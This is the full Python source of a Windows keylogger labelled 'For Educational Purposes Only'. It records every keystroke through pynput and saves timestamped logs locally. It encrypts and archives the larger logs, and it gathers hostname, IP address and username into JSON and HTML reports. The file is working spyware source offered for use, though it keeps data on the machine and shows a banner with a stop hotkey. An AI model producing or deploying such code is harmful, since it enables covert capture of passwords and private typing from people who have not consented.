#!/usr/bin/env python3

import argparse
import json
import logging
import os
import platform
import shutil
import socket
import subprocess
import sys
import threading
import time
import traceback
from datetime import datetime
from pathlib import Path

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[logging.FileHandler("keylogger.log"), logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

REQUIRED_MODULES = [
    "pynput",
    "cryptography"
]

def check_dependencies():
    if platform.system() != 'Windows':
        logger.error("This keylogger only works on Windows systems.")
        sys.exit(1)
        
    lock_file = os.path.join(os.path.expanduser("~"), ".keylogger_deps_installed")
    if os.path.exists(lock_file):
        return
    
    missing_modules = []
    for module in REQUIRED_MODULES:
        try:
            __import__(module.split('>=')[0])
        except ImportError:
            missing_modules.append(module)
    
    if missing_modules:
        logger.info(f"Installing missing modules: {', '.join(missing_modules)}")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "--user"] + missing_modules)
            logger.info("Successfully installed all required modules")
            
            with open(lock_file, 'w') as f:
                f.write(datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
                
            for module in missing_modules:
                module_name = module.split('>=')[0]
                try:
                    globals()[module_name] = __import__(module_name)
                except ImportError as e:
                    logger.error(f"Failed to import {module_name} after installation: {e}")
                    
        except Exception as e:
            logger.error(f"Failed to install required modules: {e}")
            sys.exit(1)
    else:
        with open(lock_file, 'w') as f:
            f.write(datetime.now().strftime("%Y-%m-%d %H:%M:%S"))

try:
    from pynput import keyboard
    from pynput.keyboard import Key, Listener
    from cryptography.fernet import Fernet
    lock_file = os.path.join(os.path.expanduser("~"), ".keylogger_deps_installed")
    with open(lock_file, 'w') as f:
        f.write(datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
except ImportError:
    check_dependencies()
    try:
        from pynput import keyboard
        from pynput.keyboard import Key, Listener
        from cryptography.fernet import Fernet
    except ImportError as e:
        logger.error(f"Critical error: Failed to import required modules: {e}")
        print(f"Critical error: Failed to import required modules: {e}")
        print("Please manually install the required modules listed in requirements.txt")
        sys.exit(1)

class ConfigManager:
    def __init__(self, config_file="config.json"):
        self.config_file = config_file
        self.default_config = {
            "settings": {
                "report_interval": 60,
                "encryption_enabled": True,
                "report_directory": os.path.join(os.path.expanduser("~"), "keylogger_reports")
            },
            "advanced": {
                "encryption_key": Fernet.generate_key().decode(),
                "max_log_size_kb": 5000,
            }
        }
        self.config = self.load_config()
    
    def load_config(self):
        try:
            if os.path.exists(self.config_file):
                with open(self.config_file, 'r') as f:
                    config = json.load(f)
                    self._merge_configs(self.default_config, config)
                    return config
            else:
                self.save_config(self.default_config)
                return self.default_config
        except Exception as e:
            logger.error(f"Error loading config: {e}")
            return self.default_config
    
    def _merge_configs(self, default, user):
        for key, value in default.items():
            if key not in user:
                user[key] = value
            elif isinstance(value, dict) and isinstance(user[key], dict):
                self._merge_configs(value, user[key])
    
    def save_config(self, config=None):
        if config is None:
            config = self.config
        try:
            with open(self.config_file, 'w') as f:
                json.dump(config, f, indent=4)
        except Exception as e:
            logger.error(f"Error saving config: {e}")
    
    def get(self, section, key=None):
        try:
            if key:
                return self.config[section][key]
            return self.config[section]
        except KeyError:
            return None


class Encryption:
    def __init__(self, key=None):
        if key:
            self.key = key.encode() if isinstance(key, str) else key
        else:
            self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
    
    def encrypt(self, data):
        if isinstance(data, str):
            return self.cipher.encrypt(data.encode()).decode()
        return self.cipher.encrypt(data)
    
    def decrypt(self, data):
        if isinstance(data, str):
            return self.cipher.decrypt(data.encode()).decode()
        return self.cipher.decrypt(data)


class DataCollector:
    def __init__(self, config_manager):
        self.config = config_manager
        self.encryption = Encryption(self.config.get("advanced", "encryption_key"))
        self.log_folder = os.path.join(os.path.expanduser("~"), ".logs")
        os.makedirs(self.log_folder, exist_ok=True)
        
        self.reports_dir = self.config.get("settings", "report_directory")
        os.makedirs(self.reports_dir, exist_ok=True)
        
        self.keystroke_log = []
        
        self.keyboard_listener = None
        
        self.stop_event = threading.Event()
        
        self.ctrl_pressed = False
    
    def start_keyboard_listener(self):
        self.keyboard_listener = keyboard.Listener(
            on_press=self._on_key_press,
            on_release=self._on_key_release
        )
        self.keyboard_listener.start()
        logger.info("Keyboard listener started")
    
    def _on_key_press(self, key):
        try:
            if hasattr(key, 'char') and key.char is not None:
                key_value = key.char
            else:
                key_value = str(key).replace("Key.", "")
            
            if key == Key.ctrl_l or key == Key.ctrl_r:
                self.ctrl_pressed = True
            elif hasattr(key, 'char') and key.char == 'x' and self.ctrl_pressed:
                logger.info("Stop hotkey detected (Ctrl+X)")
                self.stop()
                return False
            
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
            key_event = {
                "timestamp": timestamp,
                "event": "press",
                "key": key_value
            }
            
            self.keystroke_log.append(key_event)
            
            if len(self.keystroke_log) >= 100:
                self._save_keystrokes()
        
        except Exception as e:
            error_trace = traceback.format_exc()
            logger.error(f"Error on key press: {key} - Exception: {e}\n{error_trace}")
    
    def _on_key_release(self, key):
        try:
            if hasattr(key, 'char') and key.char is not None:
                key_value = key.char
            else:
                key_value = str(key).replace("Key.", "")
            
            if key == Key.ctrl_l or key == Key.ctrl_r:
                self.ctrl_pressed = False
            
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
            key_event = {
                "timestamp": timestamp,
                "event": "release",
                "key": key_value
            }
            
            self.keystroke_log.append(key_event)
        
        except Exception as e:
            error_trace = traceback.format_exc()
            logger.error(f"Error on key release: {key} - Exception: {e}\n{error_trace}")
    
    def _save_keystrokes(self):
        if not self.keystroke_log:
            return

        current_dir = os.path.dirname(os.path.abspath(__file__))
        log_file = os.path.join(current_dir, f"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
        
        try:
            log_text = f"=== Keylogger Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n\n"
            for entry in self.keystroke_log:
                log_text += f"[{entry['timestamp']}] {entry['event']}: {entry['key']}\n"
            log_text += f"\n=== Session End: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n"
            
            with open(log_file, 'w') as f:
                f.write(log_text)
            
            logger.info(f"Keystrokes saved to: {log_file}")
            
            self.keystroke_log = []
            
            file_size_kb = os.path.getsize(log_file) / 1024
            if file_size_kb > self.config.get("advanced", "max_log_size_kb"):
                self._encrypt_and_archive_log(log_file)
        
        except Exception as e:
            error_trace = traceback.format_exc()
            logger.error(f"Error saving keystrokes: {e}\n{error_trace}")
    
    def _encrypt_and_archive_log(self, log_file):
        if not os.path.exists(log_file):
            return
        
        try:
            with open(log_file, 'r') as f:
                content = f.read()
            
            if self.config.get("settings", "encryption_enabled"):
                content = self.encryption.encrypt(content)
            
            archive_file = log_file + ".enc"
            with open(archive_file, 'w') as f:
                f.write(content)
            
            reports_archive = os.path.join(self.reports_dir, os.path.basename(archive_file))
            with open(reports_archive, 'w') as f:
                f.write(content)
            
            with open(log_file, 'w') as f:
                f.write("[]")
            
            logger.info(f"Log file {log_file} encrypted and archived")
            logger.info(f"Archive saved to reports directory: {reports_archive}")
        
        except Exception as e:
            error_trace = traceback.format_exc()
            logger.error(f"Error encrypting log file: {e}\n{error_trace}")
    
    def get_system_info(self):
        try:
            info = {
                "hostname": socket.gethostname(),
                "ip_address": socket.gethostbyname(socket.gethostname()),
                "platform": platform.system(),
                "platform_release": platform.release(),
                "platform_version": platform.version(),
                "architecture": platform.machine(),
                "processor": platform.processor(),
                "username": os.getlogin(),
                "datetime": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            }
            return info
        except Exception as e:
            error_trace = traceback.format_exc()
            logger.error(f"Error getting system info: {e}\n{error_trace}")
            return {"error": str(e)}
    
    def stop(self):
        try:
            logger.info("Stopping keylogger...")
            
            self.stop_event.set()
            
            if self.keyboard_listener and self.keyboard_listener.is_alive():
                self.keyboard_listener.stop()
                logger.info("Keyboard listener stopped")
            
            self._save_keystrokes()
            
            self.generate_final_report()
            
            logger.info("Keylogger stopped successfully")
            print("Keylogger stopped. Final report generated in:", self.reports_dir)
            
        except Exception as e:
            error_trace = traceback.format_exc()
            logger.error(f"Error stopping keylogger: {e}\n{error_trace}")
    
    def generate_final_report(self):
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            report_file = os.path.join(self.reports_dir, f"final_report_{timestamp}.json")
            
            system_info = self.get_system_info()
            
            keystroke_logs = {}
            for filename in os.listdir(self.reports_dir):
                if filename.startswith("keylog_") and filename.endswith(".json"):
                    try:
                        filepath = os.path.join(self.reports_dir, filename)
                        with open(filepath, 'r') as f:
                            keystroke_logs[filename] = json.load(f)
                    except Exception as e:
                        error_trace = traceback.format_exc()
                        logger.error(f"Error reading log file {filename}: {e}\n{error_trace}")
            
            final_report = {
                "system_info": system_info,
                "keystroke_logs": keystroke_logs,
                "report_generated": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            }
            
            with open(report_file, 'w') as f:
                json.dump(final_report, f, indent=4)
            
            logger.info(f"Final report generated: {report_file}")
            
            self._generate_html_report(final_report, timestamp)
            
        except Exception as e:
            error_trace = traceback.format_exc()
            logger.error(f"Error generating final report: {e}\n{error_trace}")
    
    def _generate_html_report(self, report_data, timestamp):
        try:
            html_file = os.path.join(self.reports_dir, f"keylogger_report_{timestamp}.html")
            
            html_content = f"""<!DOCTYPE html>
<html>
<head>
    <title>Keylogger Report</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; }}
        h1, h2, h3 {{ color: #333; }}
        .container {{ max-width: 900px; margin: 0 auto; }}
        .system-info {{ background-color: #f5f5f5; padding: 15px; border-radius: 5px; margin-bottom: 20px; }}
        .keystroke-section {{ margin-bottom: 30px; }}
        table {{ width: 100%; border-collapse: collapse; margin-top: 10px; }}
        th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
        th {{ background-color: #f2f2f2; }}
        tr:nth-child(even) {{ background-color: #f9f9f9; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>Keylogger Report</h1>
        <p>Generated on: {report_data['report_generated']}</p>
        
        <h2>System Information</h2>
        <div class="system-info">
            <p><strong>Hostname:</strong> {report_data['system_info'].get('hostname', 'N/A')}</p>
            <p><strong>Username:</strong> {report_data['system_info'].get('username', 'N/A')}</p>
            <p><strong>IP Address:</strong> {report_data['system_info'].get('ip_address', 'N/A')}</p>
            <p><strong>Platform:</strong> {report_data['system_info'].get('platform', 'N/A')} {report_data['system_info'].get('platform_release', '')}</p>
            <p><strong>Architecture:</strong> {report_data['system_info'].get('architecture', 'N/A')}</p>
        </div>
        
        <h2>Keystroke Logs</h2>
"""
            
            for log_file, keystrokes in report_data['keystroke_logs'].items():
                html_content += f"""
        <div class="keystroke-section">
            <h3>Log File: {log_file}</h3>
            <table>
                <tr>
                    <th>Timestamp</th>
                    <th>Event</th>
                    <th>Key</th>
                </tr>
"""
                
                max_entries = min(len(keystrokes), 1000)
                for i in range(max_entries):
                    entry = keystrokes[i]
                    html_content += f"""
                <tr>
                    <td>{entry.get('timestamp', 'N/A')}</td>
                    <td>{entry.get('event', 'N/A')}</td>
                    <td>{entry.get('key', 'N/A')}</td>
                </tr>"""
                
                if len(keystrokes) > 1000:
                    html_content += f"""
                <tr>
                    <td colspan="3">... and {len(keystrokes) - 1000} more entries</td>
                </tr>"""
                    
                html_content += """
            </table>
        </div>"""
            
            html_content += """
    </div>
</body>
</html>"""
            
            with open(html_file, 'w') as f:
                f.write(html_content)
            
            logger.info(f"HTML report generated: {html_file}")
            
        except Exception as e:
            error_trace = traceback.format_exc()
            logger.error(f"Error generating HTML report: {e}\n{error_trace}")


class ReportManager:
    def __init__(self, config_manager, data_collector):
        self.config = config_manager
        self.collector = data_collector
        self.report_count = 0
        self.stop_event = self.collector.stop_event
    
    def start_reporting(self):
        interval = self.config.get("settings", "report_interval")
        self._schedule_next_report(interval)
    
    def _schedule_next_report(self, interval):
        timer = threading.Timer(interval, self._report_and_reschedule)
        timer.daemon = True
        timer.start()
    
    def _report_and_reschedule(self):
        try:
            if self.stop_event.is_set():
                logger.info("Reporting stopped due to stop event")
                return
            
            self.collector._save_keystrokes()
            logger.info("Periodic report generated")
            
            self.report_count += 1
            
            interval = self.config.get("settings", "report_interval")
            self._schedule_next_report(interval)
        
        except Exception as e:
            error_trace = traceback.format_exc()
            logger.error(f"Error in report cycle: {e}\n{error_trace}")
            if not self.stop_event.is_set():
                interval = self.config.get("settings", "report_interval")
                self._schedule_next_report(interval)


def main():
    try:
        if platform.system() != 'Windows':
            print("This keylogger only works on Windows systems.")
            sys.exit(1)
        
        parser = argparse.ArgumentParser(description="Windows Keylogger")
        parser.add_argument("--config", help="Path to config file", default="config.json")
        args = parser.parse_args()
        
        print("""
╔══════════════════════════════════════════════════╗
║               Windows Keylogger                   ║
║       For Educational Purposes Only               ║
║                                                   ║
║ Press Ctrl+X to stop the keylogger and download   ║
║ the final report.                                 ║
╚═══════════════════════════════════════════════════╝
""")
        
        config_manager = ConfigManager(args.config)
        data_collector = DataCollector(config_manager)
        report_manager = ReportManager(config_manager, data_collector)
        
        reports_dir = config_manager.get("settings", "report_directory")
        print(f"Reports will be saved to: {reports_dir}")
        
        data_collector.start_keyboard_listener()
        
        report_manager.start_reporting()
        
        print("Keylogger is running. Press Ctrl+X to stop and download the report.")
        while not data_collector.stop_event.is_set():
            time.sleep(1)
        
    except KeyboardInterrupt:
        logger.info("Keylogger stopped by user")
        if 'data_collector' in locals():
            data_collector.stop()
    except Exception as e:
        error_trace = traceback.format_exc()
        logger.error(f"Critical error: {e}\n{error_trace}")
    finally:
        sys.exit(0)


if __name__ == "__main__":
    main()